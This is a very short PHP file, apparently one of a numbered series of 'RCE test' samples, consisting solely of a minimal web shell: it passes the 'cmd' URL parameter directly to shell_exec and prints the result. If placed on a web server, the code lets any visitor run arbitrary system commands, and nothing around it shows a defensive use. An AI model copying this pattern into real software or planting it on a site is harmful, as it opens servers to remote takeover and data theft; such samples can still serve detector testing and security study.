<?php
// RCE test variation #908
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>